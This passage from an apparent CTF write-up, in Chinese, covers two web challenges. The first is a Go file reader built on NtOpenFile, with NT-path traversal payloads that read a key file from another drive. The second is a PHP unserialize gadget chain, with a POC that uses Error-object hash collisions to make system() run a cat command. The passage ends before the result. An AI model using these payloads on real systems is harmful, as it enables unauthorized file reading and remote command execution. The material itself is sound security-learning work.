</span></span><span class="line"><span class="ln">215</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">216</span><span class="cl">
</span></span><span class="line"><span class="ln">217</span><span class="cl">	<span class="k">if</span> <span class="nx">status</span> <span class="o">==</span> <span class="nx">STATUS_SUCCESS</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">218</span><span class="cl">		<span class="k">return</span> <span class="nx">handle</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="ln">219</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">220</span><span class="cl">
</span></span><span class="line"><span class="ln">221</span><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;cant open %s&#34;</span><span class="p">,</span> <span class="nx">path</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">222</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">223</span><span class="cl">
</span></span><span class="line"><span class="ln">224</span><span class="cl"><span class="kd">func</span> <span class="nf">ListDirectory</span><span class="p">(</span><span class="nx">handle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">225</span><span class="cl">	<span class="kd">const</span> <span class="nx">bufferSize</span> <span class="p">=</span> <span class="mi">65536</span>
</span></span><span class="line"><span class="ln">226</span><span class="cl">	<span class="nx">buffer</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">bufferSize</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">227</span><span class="cl">
</span></span><span class="line"><span class="ln">228</span><span class="cl">	<span class="kd">var</span> <span class="nx">iosb</span> <span class="nx">IO_STATUS_BLOCK</span>
</span></span><span class="line"><span class="ln">229</span><span class="cl">	<span class="kd">var</span> <span class="nx">listString</span> <span class="kt">string</span>
</span></span><span class="line"><span class="ln">230</span><span class="cl">	<span class="nx">listString</span> <span class="p">=</span> <span class="s">&#34;Directory\n==================\n&#34;</span>
</span></span><span class="line"><span class="ln">231</span><span class="cl">
</span></span><span class="line"><span class="ln">232</span><span class="cl">	<span class="k">for</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">233</span><span class="cl">		<span class="nx">status</span> <span class="o">:=</span> <span class="nf">queryDirectoryFile</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">234</span><span class="cl">			<span class="nx">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">235</span><span class="cl">			<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">236</span><span class="cl">			<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">237</span><span class="cl">			<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">238</span><span class="cl">			<span class="o">&amp;</span><span class="nx">iosb</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">239</span><span class="cl">			<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])),</span>
</span></span><span class="line"><span class="ln">240</span><span class="cl">			<span class="nx">bufferSize</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">241</span><span class="cl">			<span class="nx">FileDirectoryInformation</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">242</span><span class="cl">			<span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">243</span><span class="cl">			<span class="kc">nil</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">244</span><span class="cl">			<span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">245</span><span class="cl">		<span class="p">)</span>
</span></span><span class="line"><span class="ln">246</span><span class="cl">
</span></span><span class="line"><span class="ln">247</span><span class="cl">		<span class="k">if</span> <span class="nx">status</span> <span class="o">==</span> <span class="nx">STATUS_NO_MORE_FILES</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">248</span><span class="cl">			<span class="k">break</span>
</span></span><span class="line"><span class="ln">249</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">250</span><span class="cl">
</span></span><span class="line"><span class="ln">251</span><span class="cl">		<span class="k">if</span> <span class="nx">status</span> <span class="o">!=</span> <span class="nx">STATUS_SUCCESS</span> <span class="o">&amp;&amp;</span> <span class="nx">status</span> <span class="o">!=</span> <span class="nx">STATUS_BUFFER_OVERFLOW</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">252</span><span class="cl">			<span class="k">return</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;query directory failed&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">253</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">254</span><span class="cl">
</span></span><span class="line"><span class="ln">255</span><span class="cl">		<span class="nx">offset</span> <span class="o">:=</span> <span class="nb">uint32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">256</span><span class="cl">		<span class="k">for</span> <span class="nx">offset</span> <span class="p">&lt;</span> <span class="nb">uint32</span><span class="p">(</span><span class="nx">iosb</span><span class="p">.</span><span class="nx">Information</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">257</span><span class="cl">			<span class="nx">dirInfo</span> <span class="o">:=</span> <span class="p">(</span><span class="o">*</span><span class="nx">FILE_DIRECTORY_INFORMATION</span><span class="p">)(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="p">[</span><span class="nx">offset</span><span class="p">]))</span>
</span></span><span class="line"><span class="ln">258</span><span class="cl">
</span></span><span class="line"><span class="ln">259</span><span class="cl">			<span class="nx">fileNamePtr</span> <span class="o">:=</span> <span class="p">(</span><span class="o">*</span><span class="kt">uint16</span><span class="p">)(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="nx">dirInfo</span><span class="p">))</span> <span class="o">+</span> <span class="nx">unsafe</span><span class="p">.</span><span class="nf">Sizeof</span><span class="p">(</span><span class="o">*</span><span class="nx">dirInfo</span><span class="p">)))</span>
</span></span><span class="line"><span class="ln">260</span><span class="cl">			<span class="nx">fileName</span> <span class="o">:=</span> <span class="nf">utf16PtrToString</span><span class="p">(</span><span class="nx">fileNamePtr</span><span class="p">,</span> <span class="nx">dirInfo</span><span class="p">.</span><span class="nx">FileNameLength</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">261</span><span class="cl">
</span></span><span class="line"><span class="ln">262</span><span class="cl">			<span class="nx">fileType</span> <span class="o">:=</span> <span class="s">&#34;file&#34;</span>
</span></span><span class="line"><span class="ln">263</span><span class="cl">			<span class="k">if</span> <span class="nx">dirInfo</span><span class="p">.</span><span class="nx">FileAttributes</span><span class="o">&amp;</span><span class="nx">FILE_ATTRIBUTE_DIRECTORY</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">264</span><span class="cl">				<span class="nx">fileType</span> <span class="p">=</span> <span class="s">&#34;dir&#34;</span>
</span></span><span class="line"><span class="ln">265</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">266</span><span class="cl">
</span></span><span class="line"><span class="ln">267</span><span class="cl">			<span class="nx">listString</span> <span class="o">+=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;[%s] %s (size: %d bytes)\n&#34;</span><span class="p">,</span> <span class="nx">fileType</span><span class="p">,</span> <span class="nx">fileName</span><span class="p">,</span> <span class="nx">dirInfo</span><span class="p">.</span><span class="nx">EndOfFile</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">268</span><span class="cl">
</span></span><span class="line"><span class="ln">269</span><span class="cl">			<span class="k">if</span> <span class="nx">dirInfo</span><span class="p">.</span><span class="nx">NextEntryOffset</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">270</span><span class="cl">				<span class="k">break</span>
</span></span><span class="line"><span class="ln">271</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">272</span><span class="cl">			<span class="nx">offset</span> <span class="o">+=</span> <span class="nx">dirInfo</span><span class="p">.</span><span class="nx">NextEntryOffset</span>
</span></span><span class="line"><span class="ln">273</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">274</span><span class="cl">
</span></span><span class="line"><span class="ln">275</span><span class="cl">		<span class="k">if</span> <span class="nx">status</span> <span class="o">!=</span> <span class="nx">STATUS_BUFFER_OVERFLOW</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">276</span><span class="cl">			<span class="k">break</span>
</span></span><span class="line"><span class="ln">277</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">278</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">279</span><span class="cl">	<span class="k">return</span> <span class="nx">listString</span><span class="p">,</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="ln">280</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">281</span><span class="cl">
</span></span><span class="line"><span class="ln">282</span><span class="cl"><span class="kd">func</span> <span class="nf">ReadFile</span><span class="p">(</span><span class="nx">handle</span> <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">283</span><span class="cl">	<span class="kd">var</span> <span class="nx">basicInfo</span> <span class="nx">FILE_BASIC_INFORMATION</span>
</span></span><span class="line"><span class="ln">284</span><span class="cl">	<span class="kd">var</span> <span class="nx">iosb</span> <span class="nx">IO_STATUS_BLOCK</span>
</span></span><span class="line"><span class="ln">285</span><span class="cl">
</span></span><span class="line"><span class="ln">286</span><span class="cl">	<span class="nx">status</span> <span class="o">:=</span> <span class="nf">queryInformationFile</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">287</span><span class="cl">		<span class="nx">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">288</span><span class="cl">		<span class="o">&amp;</span><span class="nx">iosb</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">289</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">basicInfo</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">290</span><span class="cl">		<span class="nb">uint32</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Sizeof</span><span class="p">(</span><span class="nx">basicInfo</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">291</span><span class="cl">		<span class="nx">FileBasicInformation</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">292</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">293</span><span class="cl">
</span></span><span class="line"><span class="ln">294</span><span class="cl">	<span class="k">if</span> <span class="nx">status</span> <span class="o">!=</span> <span class="nx">STATUS_SUCCESS</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">295</span><span class="cl">		<span class="k">return</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;get file information failed&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">296</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">297</span><span class="cl">
</span></span><span class="line"><span class="ln">298</span><span class="cl">	<span class="kd">var</span> <span class="nx">fileString</span> <span class="kt">string</span>
</span></span><span class="line"><span class="ln">299</span><span class="cl">	<span class="nx">fileString</span> <span class="p">=</span> <span class="s">&#34;File\n==================\n&#34;</span>
</span></span><span class="line"><span class="ln">300</span><span class="cl">
</span></span><span class="line"><span class="ln">301</span><span class="cl">	<span class="kd">const</span> <span class="nx">maxReadSize</span> <span class="p">=</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
</span></span><span class="line"><span class="ln">302</span><span class="cl">	<span class="nx">buffer</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nx">maxReadSize</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">303</span><span class="cl">	<span class="kd">var</span> <span class="nx">offset</span> <span class="kt">int64</span> <span class="p">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">304</span><span class="cl">
</span></span><span class="line"><span class="ln">305</span><span class="cl">	<span class="nx">status</span> <span class="p">=</span> <span class="nf">readFile</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">306</span><span class="cl">		<span class="nx">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">307</span><span class="cl">		<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">308</span><span class="cl">		<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">309</span><span class="cl">		<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">310</span><span class="cl">		<span class="o">&amp;</span><span class="nx">iosb</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">311</span><span class="cl">		<span class="nb">uintptr</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">.</span><span class="nf">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])),</span>
</span></span><span class="line"><span class="ln">312</span><span class="cl">		<span class="nx">maxReadSize</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">313</span><span class="cl">		<span class="o">&amp;</span><span class="nx">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">314</span><span class="cl">		<span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">315</span><span class="cl">	<span class="p">)</span>
</span></span><span class="line"><span class="ln">316</span><span class="cl">
</span></span><span class="line"><span class="ln">317</span><span class="cl">	<span class="k">if</span> <span class="nx">status</span> <span class="o">==</span> <span class="nx">STATUS_SUCCESS</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">318</span><span class="cl">		<span class="nx">bytesRead</span> <span class="o">:=</span> <span class="nx">iosb</span><span class="p">.</span><span class="nx">Information</span>
</span></span><span class="line"><span class="ln">319</span><span class="cl">		<span class="k">if</span> <span class="nx">bytesRead</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">320</span><span class="cl">			<span class="nx">content</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">buffer</span><span class="p">[:</span><span class="nx">bytesRead</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">321</span><span class="cl">			<span class="nx">fileString</span> <span class="o">+=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%s\n&#34;</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">322</span><span class="cl">			<span class="k">if</span> <span class="nx">bytesRead</span> <span class="o">==</span> <span class="nx">maxReadSize</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">323</span><span class="cl">				<span class="nx">fileString</span> <span class="o">+=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;\n[Tip: only part of the file is read, file size may be larger than 1MB]\n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">324</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">325</span><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">326</span><span class="cl">			<span class="nx">fileString</span> <span class="o">+=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;[file is empty]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">327</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">328</span><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">329</span><span class="cl">		<span class="k">return</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;read file failed&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">330</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">331</span><span class="cl">
</span></span><span class="line"><span class="ln">332</span><span class="cl">	<span class="k">return</span> <span class="nx">fileString</span><span class="p">,</span> <span class="kc">nil</span>
</span></span><span class="line"><span class="ln">333</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>我们看handle.go</p>
<p><img alt="image-20250608172059280" loading="lazy" src="../assets/image-20250608172059280.png"></p>
<p>在这里会将我们传入的地址通过filepath.Join与<code>\SystemRoot\</code>进行拼接后传入OpenPath</p>
<p><img alt="image-20250608173711892" loading="lazy" src="../assets/image-20250608173711892.png"></p>
<p>想要使用NtOpenFile读文件我们需要使用符合格式的nt路径，而不是我们平常使用的win32路径。</p>
<p>如题目中的<code>\SystemRoot\</code>就是指向C:\Windows\的符号链接</p>
<p>可以参考：https://kiwids.me/posts/NT-Filesystem-Internals-Study-Notes/#nt-namespace-native-object-paths</p>
<p>所以我们如果想要读D盘的话，就有两种方法，第一种就是通过盘符去读</p>
<pre tabindex="0"><code>\??\D:\
</code></pre><p>第二种是通过卷的设备路径去读</p>
<pre tabindex="0"><code>\Device\HarddiskVolume3\  //HarddiskVolume2是C盘
</code></pre><p>回到这道题，由于会在传入的路径前面进行拼接，所以我们要在传入的path前面加入..</p>
<h4 id="payload">Payload<a hidden class="anchor" aria-hidden="true" href="#payload">#</a></h4>
<pre tabindex="0"><code>?path=..\??\D:\key.txt
</code></pre><p>或者</p>
<pre tabindex="0"><code>?path=..\Device\HarddiskVolume3\key.txt
</code></pre><h4 id="题外话">题外话<a hidden class="anchor" aria-hidden="true" href="#题外话">#</a></h4>
<p>事实上第一种方法是有局限性的，我们可以看到这道题的go的版本为1.20，filepath.Join不会对??\D:\进行过滤</p>
<p>而在最新的版本中会将??\转换为\.??\，导致方法一失效，如图：</p>
<p>这是GO1.23.6版的filepath.Join</p>
<p><img alt="image-20250608175939231" loading="lazy" src="../assets/image-20250608175939231.png"></p>
<p>这是GO1.20版本的filepath.Join</p>
<p><img alt="image-20250608180659681" loading="lazy" src="../assets/image-20250608180659681.png"></p>
<p>而第二种方法则不受版本限制，在高版本中依旧适用</p>
<h3 id="ez_php">ez_php<a hidden class="anchor" aria-hidden="true" href="#ez_php">#</a></h3>
<p>题目</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">class</span> <span class="nc">GOGOGO</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="nv">$dengchao</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Go Go Go~ 出发喽！&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dengchao</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">class</span> <span class="nc">DouBao</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">public</span> <span class="nv">$dao</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">public</span> <span class="nv">$Dagongren</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">public</span> <span class="nv">$Bagongren</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Dagongren</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Bagongren</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Dagongren</span><span class="p">)</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Bagongren</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Dagongren</span><span class="p">)</span><span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Bagongren</span><span class="p">))</span> <span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dao</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;诗人我吃！&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">class</span> <span class="nc">HeiCaFei</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$HongCaFei</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">HongCaFei</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;What do you want to do?&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>POC</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">class</span> <span class="nc">GOGOGO</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="nv">$dengchao</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">class</span> <span class="nc">DouBao</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">public</span> <span class="nv">$dao</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">public</span> <span class="nv">$Dagongren</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">public</span> <span class="nv">$Bagongren</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">class</span> <span class="nc">HeiCaFei</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">public</span> <span class="nv">$HongCaFei</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GOGOGO</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$exp</span> <span class="o">-&gt;</span> <span class="na">dengchao</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Doubao</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$hcf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HeiCaFei</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$hcf</span><span class="o">-&gt;</span><span class="na">HongCaFei</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$exp</span> <span class="o">-&gt;</span> <span class="na">dengchao</span> <span class="o">-&gt;</span> <span class="na">dao</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$hcf</span><span class="p">,</span><span class="s2">&#34;cat /ofl1111111111ove4g&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;xrntkk&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;xrntkk&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">$exp</span> <span class="o">-&gt;</span> <span class="na">dengchao</span> <span class="o">-&gt;</span> <span class="na">Dagongren</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="nv">$exp</span> <span class="o">-&gt;</span> <span class="na">dengchao</span> <span class="o">-&gt;</span> <span class="na">Bagongren</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$exp</span><span class="p">));</span>
</span></span></code></pre></div><p>得到</p>
